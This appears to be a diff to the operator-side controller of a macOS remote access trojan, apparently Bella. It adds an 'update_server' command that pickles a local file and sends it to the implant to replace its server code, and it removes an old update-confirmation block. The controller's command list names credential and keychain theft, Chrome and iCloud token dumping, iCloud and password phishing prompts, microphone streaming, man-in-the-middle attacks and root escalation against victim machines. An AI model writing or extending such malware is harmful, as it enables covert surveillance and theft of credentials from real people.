@@ -29,7 +29,7 @@ redX = "%s[x] %s" % (red, endC)
 greenCheck = "%s[+] %s" % (green, endC)
 bluePlus = "%s[*] %s" % (blue, endC)
 
-commands = ['iCloud_query', 'set_client_name', 'upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
+commands = ['iCloud_query', 'set_client_name', 'update_server', 'upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
 
 def subprocess_cleanup(subprocess_list):
     if len(subprocess_list) > 0:
@@ -508,6 +508,20 @@ def main():
                     if nextcmd == "set_client_name":
                         nextcmd += ":::" + (raw_input("🐷  Please specify a client name: ") or computername)
 
+                    if nextcmd == "update_server":
+                        if nextcmd == "update_server": #no stdin
+                            local_file= raw_input("📡  Enter full path to new server on local machine: ")
+                        else:
+                            local_file = nextcmd[14:] #take path as stdin
+                        local_file = subprocess.check_output('printf %s' % local_file, shell=True) #get the un-escaped version for python recognition
+                        if os.path.isfile(local_file):
+                            with open(local_file, 'rb') as content:
+                                new_server = content.read()
+                            nextcmd = "update_server%s" % pickle.dumps(new_server)
+                        else:
+                            print "Could not find [%s]!" % local_file
+                            nextcmd = ''
+
                     if nextcmd == "disableKM":
                         print "[1] Keyboard | [2] Mouse"
                         device = raw_input("Which device would you like to disable? ")
@@ -556,12 +570,6 @@ def main():
                         nextcmd = ""
                         if raw_input("Are you sure you want to shutdown the server?\nThis will unload all LaunchAgents: (Y/n) ").lower() == "y":
                             nextcmd = "shutdownserver_yes"
-                    
-                    if nextcmd == "updateserver_yes":
-                        if raw_input("Are you sure you want to update the server?: (Y/n) ").lower() == "y":
-                            nextcmd = "updateserver_yes"
-                        else:
-                            nextcmd = ""  
 
                     if nextcmd == "vnc":
                         if platform.system() == 'Linux':
